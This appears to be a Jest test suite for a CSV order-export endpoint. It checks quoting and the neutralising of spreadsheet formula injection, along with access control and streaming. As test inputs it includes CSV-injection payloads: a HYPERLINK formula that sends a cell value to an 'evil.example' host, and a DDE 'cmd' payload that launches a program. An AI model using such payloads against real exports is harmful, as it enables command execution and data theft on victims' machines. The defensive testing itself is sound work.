// Batch 5 — CSV export hardening (GET /api/admin/export/orders + utils/helpers csvCell)
//
// Two risks in the old export, both reachable by a normal customer:
//   1. CSV injection — a customer registers with the name  =HYPERLINK("http://evil","click")  and an admin opens
//      the export in Excel/Sheets, which would EVALUATE that cell.
//   2. Broken rows — a name such as  Smith, John  or one with a quote/line break shifted every later column.
// The export is read back with an independent RFC 4180 parser (tests/helpers/csv.js), the way a spreadsheet would.

const mongoose = require("mongoose");
const app = require("../../server");
const Order = require("../../models/Order");
const { csvCell } = require("../../utils/helpers");
const { query } = require("../helpers/chain");
const { loginAs } = require("../helpers/auth");
const { anonymous } = require("../helpers/client");
const { parseCsv } = require("../helpers/csv");

const HEADER = ["Order ID", "User Name", "User Email", "Total Amount", "Status", "Payment Method", "Date"];
const FORMULA_START = /^[=+\-@\t\r]/;

describe("csvCell", () => {
  test("plain values pass through untouched", () => {
    expect(csvCell("Asha Rao")).toBe("Asha Rao");
    expect(csvCell("Asha Rao", { text: true })).toBe("Asha Rao");
    expect(csvCell("a@b.co", { text: true })).toBe("a@b.co");
  });

  test("numbers are not text: a negative or positive number is NOT prefixed (it is not user-typed)", () => {
    expect(csvCell(250.5)).toBe("250.5");
    expect(csvCell(-5)).toBe("-5");
    expect(csvCell(0)).toBe("0");
  });

  test("null and undefined become an empty cell, never the words null/undefined", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
    expect(csvCell(null, { text: true })).toBe("");
  });

  test.each([
    ["comma", "Smith, John", '"Smith, John"'],
    ["quote", 'He said "hi"', '"He said ""hi"""'],
    ["line feed", "line1\nline2", '"line1\nline2"'],
    ["carriage return", "line1\rline2", '"line1\rline2"'],
    ["CRLF", "a\r\nb", '"a\r\nb"'],
    ["only a quote", '"', '""""'],
  ])("a value containing a %s is quoted (quotes doubled)", (_label, input, expected) => {
    expect(csvCell(input)).toBe(expected);
  });

  test.each(["=1+1", "+1+1", "-1+1", "@SUM(A1)", "\t=1+1", "\r=1+1", "=HYPERLINK(\"http://evil.example\",\"x\")"])(
    "text value %j is neutralised with a leading apostrophe",
    (input) => {
      const cell = csvCell(input, { text: true });
      const [parsed] = parseCsv(cell)[0];
      expect(parsed).toBe(`'${input}`);
      expect(FORMULA_START.test(parsed)).toBe(false);
    }
  );

  test("without { text: true } the value is NOT touched (so ids, amounts and dates are not altered)", () => {
    expect(csvCell("=1+1")).toBe("=1+1");
  });

  test("formula characters only matter at the START of the cell", () => {
    expect(csvCell("a=b+c-d@e", { text: true })).toBe("a=b+c-d@e");
    expect(csvCell("Mary-Anne", { text: true })).toBe("Mary-Anne");
    expect(csvCell("o'neil+co@x.in", { text: true })).toBe("o'neil+co@x.in");
  });

  test("neutralising and quoting combine correctly (prefix first, then quote)", () => {
    const cell = csvCell('-John, "Jr"', { text: true });
    expect(cell).toBe('"\'-John, ""Jr"""');
    expect(parseCsv(cell)[0]).toEqual(["'-John, \"Jr\""]);
  });

  test("every output re-parses to exactly one cell, whatever the input", () => {
    const nasty = ['a,b', '"', '""', ",", "\n", "\r\n", "=,=", '=",', "x\n=cmd", ""];
    for (const value of nasty) {
      for (const text of [false, true]) {
        expect(parseCsv(`${csvCell(value, { text })}\n`)).toHaveLength(1);
        expect(parseCsv(`${csvCell(value, { text })}\n`)[0]).toHaveLength(1);
      }
    }
  });
});

describe("GET /api/admin/export/orders", () => {
  const order = (over = {}) => ({
    _id: new mongoose.Types.ObjectId(),
    user: { _id: new mongoose.Types.ObjectId(), name: "Asha Rao", email: "asha@example.com" },
    totalAmount: 250.5,
    orderStatus: "Pending",
    paymentMethod: "Cash on Delivery",
    createdAt: new Date("2026-03-04T10:00:00Z"),
    ...over,
  });

  const exportWith = async (orders) => {
    const { agent } = await loginAs(app, { role: "admin" });
    const find = jest.spyOn(Order, "find").mockReturnValue(query(orders));
    const res = await agent.get("/api/admin/export/orders");
    return { res, find, rows: parseCsv(res.text) };
  };

  test("a normal export: CSV headers, the unchanged 7-column header, one row per order", async () => {
    const a = order();
    const b = order({ orderStatus: "Delivered", paymentMethod: "UPI", totalAmount: 99 });
    const { res, rows } = await exportWith([a, b]);

    expect(res.status).toBe(200);
    expect(res.headers["content-type"]).toMatch(/^text\/csv/);
    expect(res.headers["content-disposition"]).toBe("attachment; filename=orders.csv");
    expect(res.text.split("\n")[0]).toBe("Order ID,User Name,User Email,Total Amount,Status,Payment Method,Date");
    expect(rows[0]).toEqual(HEADER);
    expect(rows).toHaveLength(3);
    expect(rows[1].slice(0, 6)).toEqual([a._id.toString(), "Asha Rao", "asha@example.com", "250.5", "Pending", "Cash on Delivery"]);
    expect(rows[2].slice(0, 6)).toEqual([b._id.toString(), "Asha Rao", "asha@example.com", "99", "Delivered", "UPI"]);
  });

  test("the query is unchanged: newest first, user name+email populated, lean", async () => {
    const chain = {
      sort: jest.fn(() => chain),
      populate: jest.fn(() => chain),
      lean: jest.fn(() => chain),
      then: (resolve, reject) => Promise.resolve([order()]).then(resolve, reject),
    };
    const { agent } = await loginAs(app, { role: "admin" });
    const find = jest.spyOn(Order, "find").mockReturnValue(chain);

    const res = await agent.get("/api/admin/export/orders");

    expect(res.status).toBe(200);
    expect(find).toHaveBeenCalledWith({});
    expect(chain.sort).toHaveBeenCalledWith({ createdAt: -1 });
    expect(chain.populate).toHaveBeenCalledWith("user", "name email");
    expect(chain.lean).toHaveBeenCalled();
  });

  test("a name with a comma, a quote or a line break stays in ITS OWN cell — every row still has 7 columns", async () => {
    const names = ["Smith, John", 'Dwayne "The Rock" J', "Two\nLines", "Trailing,", '"', "a,b,c,d,e,f,g,h"];
    const { rows } = await exportWith(names.map((name) => order({ user: { name, email: "x@y.in" } })));

    expect(rows).toHaveLength(names.length + 1);
    rows.forEach((row) => expect(row).toHaveLength(7));
    expect(rows.slice(1).map((r) => r[1])).toEqual(names);
    rows.slice(1).forEach((r) => expect(r[2]).toBe("x@y.in")); // later columns did not shift
  });

  test.each([
    ['=HYPERLINK("http://evil.example/?x="&A1,"click")'],
    ["=cmd|' /C calc'!A0"],
    ["+1+1"],
    ["-2+3"],
    ["@SUM(1+1)"],
    ["\t=1+1"],
    ["\r=1+1"],
  ])("a customer-controlled name %j cannot become a formula", async (name) => {
    const { rows } = await exportWith([order({ user: { name, email: "x@y.in" } })]);

    const cell = rows[1][1];
    expect(cell).toBe(`'${name}`); // the visible text is preserved, but it is inert
    expect(FORMULA_START.test(cell)).toBe(false);
    expect(rows[1]).toHaveLength(7);
  });

  test("the e-mail column is neutralised as well", async () => {
    const { rows } = await exportWith([order({ user: { name: "Eve", email: "=1+1@evil.example" } })]);
    expect(rows[1][2]).toBe("'=1+1@evil.example");
  });

  test("status and payment method are treated as text too (defence in depth)", async () => {
    const { rows } = await exportWith([order({ orderStatus: "=1+1", paymentMethod: "@x" })]);
    expect(rows[1][4]).toBe("'=1+1");
    expect(rows[1][5]).toBe("'@x");
  });

  test("a deleted user still exports: N/A in both columns (the 'N/A' is never prefixed or dropped)", async () => {
    const { rows } = await exportWith([order({ user: null }), order({ user: { name: "", email: "" } })]);
    expect(rows[1].slice(1, 3)).toEqual(["N/A", "N/A"]);
    expect(rows[2].slice(1, 3)).toEqual(["N/A", "N/A"]);
  });

  test("the numeric and date columns are written as-is (a numeric total is never given an apostrophe)", async () => {
    const { rows } = await exportWith([order({ totalAmount: 1234.75 })]);
    expect(rows[1][3]).toBe("1234.75");
    expect(rows[1][6]).toBe(new Date("2026-03-04T10:00:00Z").toLocaleDateString("en-IN"));
  });

  test("NO orders at all still downloads a valid CSV: just the header row (not an empty file)", async () => {
    const { res, rows } = await exportWith([]);
    expect(res.status).toBe(200);
    expect(res.headers["content-type"]).toMatch(/^text\/csv/);
    expect(res.text).toBe("Order ID,User Name,User Email,Total Amount,Status,Payment Method,Date\n");
    expect(rows).toEqual([HEADER]);
  });

  test("the header appears exactly once however many orders there are", async () => {
    const { res } = await exportWith([order(), order(), order()]);
    expect(res.text.match(/^Order ID,/gm)).toHaveLength(1);
  });

  test("a negative total stays a number: only user-typed text is prefixed, system numbers are never altered", async () => {
    const { rows } = await exportWith([order({ totalAmount: -5 })]);
    expect(rows[1][3]).toBe("-5"); // a refund-style value must not become the text '-5
  });

  test("it still STREAMS: more orders than one stream chunk come out complete and in order", async () => {
    const many = Array.from({ length: 500 }, (_v, i) => order({ totalAmount: i }));
    const { rows } = await exportWith(many);
    expect(rows).toHaveLength(501);
    expect(rows.slice(1).map((r) => Number(r[3]))).toEqual(many.map((o) => o.totalAmount));
    expect(rows[1][0]).toBe(many[0]._id.toString());
  });

  test("a database failure is a clean 500 before any CSV is sent", async () => {
    const { agent } = await loginAs(app, { role: "admin" });
    jest.spyOn(Order, "find").mockImplementation(() => { throw new Error("db down"); });
    const res = await agent.get("/api/admin/export/orders");
    expect(res.status).toBe(500);
    expect(res.headers["content-type"]).toMatch(/json/);
    expect(res.body.success).toBe(false);
    expect(res.body.stack).toBeUndefined();
  });

  test("access control is unchanged: anonymous → 401, a customer → 403, and no query runs", async () => {
    const find = jest.spyOn(Order, "find");
    expect((await (await anonymous(app)).get("/api/admin/export/orders")).status).toBe(401);
    const { agent } = await loginAs(app, { role: "customer" });
    expect((await agent.get("/api/admin/export/orders")).status).toBe(403);
    expect(find).not.toHaveBeenCalled();
  });
});
